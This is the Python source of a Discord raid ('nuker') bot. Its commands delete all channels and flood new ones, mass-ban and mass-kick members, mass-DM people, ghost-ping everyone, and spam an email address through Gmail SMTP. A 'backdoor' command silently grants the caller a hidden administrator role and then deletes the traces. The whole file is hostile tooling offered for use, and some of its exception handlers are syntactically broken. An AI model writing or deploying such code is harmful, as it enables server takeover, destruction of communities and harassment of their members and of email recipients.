import discord, asyncio, settings, smtplib, os
from discord.ext import commands
from discord.utils import get

intents = discord.Intents.all()
client = commands.Bot(command_prefix=settings.prefix, intents=intents)

@client.event
async def on_ready():
    print('bot loaded!')
@client.command(help='Spams text channels (really annoying to clean up)')
async def spamchannel(ctx, num:int=None, channelname=None):
    if settings.locked == True:
        if ctx.author.id == settings.owner_id:
            if num == None:
                await ctx.send('Missing required variable `number`!')
            elif channelname == None:
                await ctx.send('Missing required variable `channelname`!')
            else:
                for x in range(0, num):
                    await ctx.guild.create_text_channel(channelname)
                await ctx.send(f'Successfully made {num} channels!')
    else:
        if num == None:
            await ctx.send('Missing required variable `number`!')
        elif channelname == None:
            await ctx.send('Missing required variable `channelname`!')
        else:
            for x in range(0, num):
                await ctx.guild.create_text_channel(channelname)
            await ctx.send(f'Successfully made {num} channels!')
@client.command(help='Deletes all channels in a server, then spams channels')
async def replacechannels(ctx, num:int=None, channelname=None):
    if settings.locked == True:
        if ctx.author.id == settings.owner_id:
            if num == None:
                await ctx.send('Missing required variable `number`!')
            elif channelname == None:
                await ctx.send('Missing required variable `channelname`!')
            else:
                for channel in ctx.guild.channels:
                    try:
                        await channel.delete()
                    except:
                        pass
                for x in range(0, num):
                    await ctx.guild.create_text_channel(channelname)
    else:
        if num == None:
            await ctx.send('Missing required variable `number`!')
        elif channelname == None:
            await ctx.send('Missing required variable `channelname`!')
        else:
            for channel in ctx.guild.channels:
                await channel.delete()
            for x in range(0, num):
                await ctx.guild.create_text_channel(channelname)
@client.command(help='DMs someone with a message you choose')
async def dm(ctx, user:discord.User=None, *, message=None):
    if settings.locked == True:
        if ctx.author.id == settings.owner_id:
            if user == None:
                await ctx.send('Please provide a user!')
            elif message == None:
                await ctx.send('Please provide a message!')
            else:
                try:
                    await user.send(message)
                    await ctx.send(f'Successfully dmed `{user}`')
                except:
                    await ctx.send(f'Failed to dm `{user}`')
    else:
        if user == None:
            await ctx.send('Please provide a user!')
        elif message == None:
            await ctx.send('Please provide a message!')
        else:
            try:
                await user.send(message)
                await ctx.send(f'Successfully dmed `{user}`')
            except:
                await ctx.send(f'Failed to dm `{user}`')
@client.command(help='Pings the channel without leaving a message')
async def ghostping(ctx):
    if settings.locked == True:
        if ctx.author.id == settings.owner_id:
            msg = await ctx.send('@everyone')
            await msg.delete()
    else:
        msg = await ctx.send('@everyone')
        await msg.delete()
@client.command(help='Ghostpings every channel (might not want to spam, as yo can get temp banned if it is run 10 times per minute or more for 5 minutes)')
async def massghostping(ctx):
    if settings.locked == True:
        if ctx.author.id == settings.owner_id:
            for channel in ctx.guild.text_channels:
                try:
                    msg = await channel.send('@everyone')
                    await msg.delete()
                except:
                    pass
    else:
        for channel in ctx.guild.text_channels:
            try:
                msg = await channel.send('@everyone')
                await msg.delete()
            except:
                pass
@client.command(help='DMs everyone in the server with the message you choose')
async def massdm(ctx, *, message=None):
    if settings.locked == True:
        if ctx.author.id == settings.owner_id:
            if message == None:
                await ctx.send('Missing required variable message!')
            else:
                for member in ctx.guild.members:
                    try:
                        await member.send(message)
                    except:
                        pass
                await ctx.send('finished dming')
    else:
        if message == None:
            await ctx.send('Missing required variable message!')
        else:
            for member in ctx.guild.members:
                try:
                    await member.send(message)
                except:
                    pass
            await ctx.send('finished dming')
@client.command(help='Bans everyone it can, except you')
async def massban(ctx, *, reason=None):
    if settings.locked == True:
        if ctx.author.id == settings.owner_id:
            for member in ctx.guild.members:
                if member.id != ctx.author.id:
                    try:
                        await member.ban(reason=reason)
                    except:
                        pass
            await ctx.send('finished banning')
    else:
        for member in ctx.guild.members:
            if member.id != ctx.author.id:
                try:
                    await member.ban(reason=reason)
                except:
                    pass
        await ctx.send('finished banning')
@client.command(help='Kicks everyone it can, except you')
async def masskick(ctx, *, reason=None):
    if settings.locked == True:
        if ctx.author.id == settings.owner_id:
            for member in ctx.guild.members:
                if member.id != ctx.author.id:
                    try:
                        await member.kick(reason=reason)
                    except:
                        pass
            await ctx.send('finished kicking')
    else:
        for member in ctx.guild.members:
            if member.id != ctx.author.id:
                try:
                    await member.kick(reason=reason)
                except:
                    pass
        await ctx.send('finished kicking')
@client.command(help='Gives you admin in the server')
async def backdoor(ctx):
    if settings.locked == True:
        if ctx.author.id == settings.owner_id:
            await ctx.message.delete()
            if discord.utils.get(ctx.guild.roles, name='˞'):
                role = discord.utils.get(ctx.guild.roles, name='˞')
                await ctx.author.add_roles(role)
            else:
                await ctx.guild.create_role(name='˞', permissions=discord.Permissions(administrator=True))
                role = discord.utils.get(ctx.guild.roles, name='˞')
                top = ctx.guild.me.top_role.position
                await role.edit(position=top-1)
                await ctx.author.add_roles(role)
            msg = await ctx.send('executed back door successfully ;)')
            await asyncio.sleep(5)
            await msg.delete()
    else:
        await ctx.message.delete()
        if discord.utils.get(ctx.guild.roles, name='˞'):
            role = discord.utils.get(ctx.guild.roles, name='˞')
            await ctx.author.add_roles(role)
        else:
            await ctx.guild.create_role(name='˞', permissions=discord.Permissions(administrator=True))
            role = discord.utils.get(ctx.guild.roles, name='˞')
            top = ctx.guild.me.top_role.position
            await role.edit(position=top-1)
            await ctx.author.add_roles(role)
        msg = await ctx.send('executed back door successfully ;)')
        await asyncio.sleep(5)
        await msg.delete()
@client.command(help='Sends an email to the email provided | For subjectmessage, seperate your subject and message with a ; | Any more separators will just not be added to the email.')
async def email(ctx, email=None, *, subjectmessage=None):
    if settings.locked == True:
        if settings.owner_id == ctx.author.id:
            if email == None:
                await ctx.send('Missing required variable `email`!')
            elif subjectmessage == None:
                await ctx.send('Missing required variable `subjectmessage`!')
            else:
                try:
                    msg = await ctx.send('Sending email...')
                    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
                        smtp.ehlo()
                        smtp.starttls()
                        smtp.ehlo()
                        smtp.login(settings.email, settings.empass)
                        submsg = subjectmessage.split(';')
                        submsgcompiled = f'Subject: {submsg[0]}\n\n{submsg[1]}'
                        smtp.sendmail(settings.email, email, submsgcompiled)
                    await msg.edit(content=f'Successfully sent `{submsg[1]}` to `{email}` with the subject `{submsg[0]}`!')
                except:
                    await ctx.send('An error has occurred, please try again.')
    else:
        if email == None:
            await ctx.send('Missing required variable `email`!')
        elif subjectmessage == None:
            await ctx.send('Missing required variable `subjectmessage`!')
        else:
            try:
                msg = await ctx.send('Sending email...')
                with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
                    smtp.ehlo()
                    smtp.starttls()
                    smtp.ehlo()
                    smtp.login(settings.email, settings.empass)
                    submsg = subjectmessage.split(';')
                    submsgcompiled = f'Subject: {submsg[0]}\n\n{submsg[1]}'
                    smtp.sendmail(settings.email, email, submsgcompiled)
                await msg.edit(content=f'Successfully sent `{submsg[1]}` to `{email}` with the subject `{submsg[0]}`!')
            except:
                await ctx.send('An error has occurred, please try again.')
@client.command(help='Spams emails to the email provided. This one may take a really long time depending on the amount of times you spam. The bot even sometimes restarts during the process, but keeps emailing, as the script is still working. | For subjectmessage, seperate your subject and message with a ; | Any more separators will just not be added to the email.')
async def emspam(ctx, email=None, num:int=None, *, subjectmessage=None):
    if settings.locked == True:
        if settings.owner_id == ctx.author.id:
            if email == None:
                await ctx.send('Missing required variable `email`!')
            elif subjectmessage == None:
                await ctx.send('Missing required variable `subjectmessage`!')
            elif num == None:
                await ctx.send('Missing required variable `num`!')
            else:
                try:
                    msg = await ctx.send('Sending emails...')
                    for num2 in range(1, num+1):

                        with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
                            smtp.ehlo()
                            smtp.starttls()
                            smtp.ehlo()
                            smtp.login(settings.email, settings.empass)
                            submsg = subjectmessage.split(';')
                            submsgcompiled = f'Subject: {submsg[0]}\n\n{submsg[1]}'
                            smtp.sendmail(settings.email, email, submsgcompiled)
                    await msg.edit(content=f'Successfully sent `{submsg[1]}` to `{email}` `{str(num)}` times with the subject `{submsg[0]}`!')
                except:
                    await ctx.send('An error has occurred, please try again.')
    else:
        if email == None:
            await ctx.send('Missing required variable `email`!')
        elif subjectmessage == None:
            await ctx.send('Missing required variable `subjectmessage`!')
        elif num == None:
            await ctx.send('Missing required variable `num`!')
        else:
            try:
                msg = await ctx.send('Sending emails...')
                for num2 in range(1, num+1):

                    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
                        smtp.ehlo()
                        smtp.starttls()
                        smtp.ehlo()
                        smtp.login(settings.email, settings.empass)
                        submsg = subjectmessage.split(';')
                        submsgcompiled = f'Subject: {submsg[0]}\n\n{submsg[1]}'
                        smtp.sendmail(settings.email, email, submsgcompiled)
                await msg.edit(content=f'Successfully sent `{submsg[1]}` to `{email}` `{str(num)}` times with the subject `{submsg[0]}`!')
            except:
                await ctx.send('An error has occurred, please try again.')
@client.command(help='Spam DMs someone with a message you choose')
async def dmspam(ctx, user:discord.User=None, num:int=None, *, message=None):
    if settings.locked == True:
        if ctx.author.id == settings.owner_id:
            if user == None:
                await ctx.send('Please provide a user!')
            elif message == None:
                await ctx.send('Please provide a message!')
            elif num == None:
                await ctx.send('Missing Required Variable `Number`!')
            else:
                for e in range(0,num):
                    try:
                        await user.send(message)
                    except:
                await ctx.send(f"Sent/tried to send `{num}` messages with the content `{message}`!")
    else:
        if user == None:
            await ctx.send('Please provide a user!')
        elif message == None:
            await ctx.send('Please provide a message!')
        elif num == None:
            await ctx.send('Missing Required Variable `Number`!')
        else:
            for e in range(0,num):
                try:
                    await user.send(message)
                except:
            await ctx.send(f"Sent/tried to send `{num}` messages with the content `{message}`!")

client.run(settings.token)
